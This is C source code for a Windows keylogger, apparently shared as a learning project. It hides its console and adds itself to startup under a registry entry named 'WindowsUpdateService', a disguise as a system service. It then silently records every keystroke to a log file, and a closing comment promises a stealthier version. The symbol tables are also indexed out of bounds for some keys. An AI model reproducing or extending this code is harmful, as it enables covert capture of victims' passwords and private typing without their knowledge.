#include <stdio.h>
#include <windows.h>
#include <time.h>
// hide console 😎
void HideConsole() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
}
// shutdown or logoff
BOOL WINAPI ConsoleHandler(DWORD signal) {
    if (signal == CTRL_LOGOFF_EVENT || signal == CTRL_SHUTDOWN_EVENT) {
        exit(0);
    }
    return TRUE;
}
//shift pressed or not
int isShiftPressed() {
    return (GetKeyState(VK_SHIFT) & 0x8000) != 0;
}
//capslock pressed or not
int isCapsLockOn() {
    return (GetKeyState(VK_CAPITAL) & 1) != 0;
}
//logTimeStamp ... Optional
void logTimestamp(FILE *file) {
    time_t now = time(NULL);
    struct tm *lt = localtime(&now);
    fprintf(file, "\n\n[Time: %02d:%02d:%02d | %02d-%02d-%04d]\n",
            lt->tm_hour, lt->tm_min, lt->tm_sec,
            lt->tm_mday, lt->tm_mon + 1, lt->tm_year + 1900);
}

// Adds the .exe to Windows Startup registry
void AddToStartup(const char *exePath, const char *entryName) {
    HKEY hKey;
    RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    RegSetValueEx(hKey, entryName, 0, REG_SZ, (const BYTE *)exePath, strlen(exePath) + 1);
    RegCloseKey(hKey);
}

// Handles special keys like Enter, Backspace etc.
void logSpecialKey(int key, FILE *file) {
    switch (key) {
        case VK_BACK: fprintf(file, "[BACKSPACE]"); break;
        case VK_RETURN: fprintf(file, "[ENTER]\n"); break;
        case VK_SPACE: fprintf(file, " "); break;
        case VK_TAB: fprintf(file, "[TAB]"); break;
        case VK_SHIFT: fprintf(file, "[SHIFT]"); break;
        case VK_CONTROL: fprintf(file, "[CTRL]"); break;
        case VK_MENU: fprintf(file, "[ALT]"); break;
        case VK_ESCAPE: fprintf(file, "[ESC]"); break;
        case VK_LEFT: fprintf(file, "[LEFT]"); break;
        case VK_RIGHT: fprintf(file, "[RIGHT]"); break;
        case VK_UP: fprintf(file, "[UP]"); break;
        case VK_DOWN: fprintf(file, "[DOWN]"); break;
        case VK_DELETE: fprintf(file, "[DEL]"); break;
        default: fprintf(file, "[0x%X]", key); break;
    }
}

int main() {
    HideConsole();
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);

    // Add current .exe to Windows startup
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    AddToStartup(path, "WindowsUpdateService");

    FILE *logFile = fopen("log.txt", "a");
    if (!logFile) return 1;

    short prevKeyState[256] = {0};
    int loggedOnce = 0;

    while (1) {
        for (int key = 8; key <= 255; key++) {
            short keyState = GetAsyncKeyState(key);

            if ((keyState & 0x8000) && !prevKeyState[key]) {
                if (!loggedOnce) {
                    logTimestamp(logFile);
                    loggedOnce = 1;
                }

                int shift = isShiftPressed();
                int caps = isCapsLockOn();
                char ch = 0;

                if ((key >= 'A' && key <= 'Z')) {
                    ch = (shift ^ caps) ? key : key + 32;
                    fprintf(logFile, "%c", ch);
                } else if (key >= '0' && key <= '9') {
                    if (shift) {
                        const char shiftedNums[] = {')','!','@','#','$','%','^','&','*','('};
                        fprintf(logFile, "%c", shiftedNums[key - '0']);
                    } else {
                        fprintf(logFile, "%c", key);
                    }
                } else if (key >= 186 && key <= 222) {
                    const char normalKeys[] = {';', '=', ',', '-', '.', '/', '`', '[', '\\', ']', '\'', 0};
                    const char shiftedKeys[] = {':', '+', '<', '_', '>', '?', '~', '{', '|', '}', '"', 0};
                    int index = key - 186;
                    char symbol = shift ? shiftedKeys[index] : normalKeys[index];
                    fprintf(logFile, "%c", symbol);
                } else {
                    logSpecialKey(key, logFile);
                }

                fflush(logFile);
            }

            prevKeyState[key] = keyState & 0x8000;
        }

        Sleep(50);
    }

    fclose(logFile);
    return 0;
}
//Thank you guys! This project is only an example,,,, in future we gonna build a advance and super stealthy keylogger...😉